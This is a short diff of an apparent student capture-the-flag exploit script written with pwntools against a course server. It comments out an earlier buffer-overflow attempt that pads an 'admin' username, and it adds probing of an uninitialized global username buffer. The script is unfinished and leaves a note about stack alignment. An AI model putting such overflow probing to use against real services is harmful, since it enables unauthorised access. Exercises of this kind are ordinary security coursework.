@@ -23,6 +23,7 @@ with remote("csc748.hostbin.org", 7061) as p:
     test = p.recv()
     """
 
+    """
     p.recv()    # Silence banner: Main Options
     p.send(b"1\n")    # Enter username
     p.recv()    # Silence banner: Enter Username
@@ -30,5 +31,14 @@ with remote("csc748.hostbin.org", 7061) as p:
     overflow = b"A"*11
     p.send(b"admin" + overflow + b"BBBBBBBB" + b"\n")
     p.recv()    # Silence banner: Main Options
+    """
+
+    # Here we will take advantage of the uninitialized global variable char auth_username[16];
+    p.recv()    # Silence banner: Main Options
+    p.send(b"2\n")    # Confirm Username
+    username = p.recv()    # Silence banner: Configure Username Options
+    print(username)
+
+    # Think I have to do something with the stack alignment...
 
     p.interactive()
